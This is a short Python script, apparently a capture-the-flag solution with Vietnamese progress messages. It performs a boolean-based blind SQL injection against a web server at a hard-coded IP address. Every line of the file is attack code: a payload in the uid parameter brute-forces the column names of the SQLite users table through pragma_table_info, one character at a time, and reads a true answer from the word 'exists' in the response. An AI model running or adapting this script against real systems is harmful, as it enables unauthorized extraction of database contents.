import requests

charset = 'abcdefghijklmnopqrstuvwxyz0123456789_'
length = 4

colum1 = ''
colum2 = ''
colum3 = ''

burp0_headers = {
    "Accept-Language": "en-US", 
    "Upgrade-Insecure-Requests": "1", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
    "Referer": "http://103.97.125.56:30466/", 
    "Accept-Encoding": "gzip, deflate, br", 
    "Connection": "keep-alive"
    }
for OFFSET in range (3):
    for index in range (1,length):
        for c in charset:
            url = f"http://103.97.125.56:30466/?uid=admin'+AND+(SELECT+(SUBSTR((SELECT+name+FROM+pragma_table_info('users')+LIMIT+1+OFFSET+{OFFSET}),{index},1)%3d'{c}')%3d1)--"
            
            response = requests.get(url, headers=burp0_headers)

            print("dang test ki tu thu ",index," :",c,end="\r")
            
            if OFFSET == 0:
                if "exists" in response.text:
                    colum1 += c
                    print("ki tu",index,"la",c,"---->","column1{",colum1,"}")
                    break
            elif OFFSET == 1:
                if "exists" in response.text:
                    colum2 += c
                    print("ki tu",index,"la",c,"---->","column2{",colum2,"}")
                    break
            else:
                if "exists" in response.text:
                    colum3 += c
                    print("ki tu",index,"la",c,"---->","column3{",colum3,"}")
                    break

else:
    print("finished !!!")                   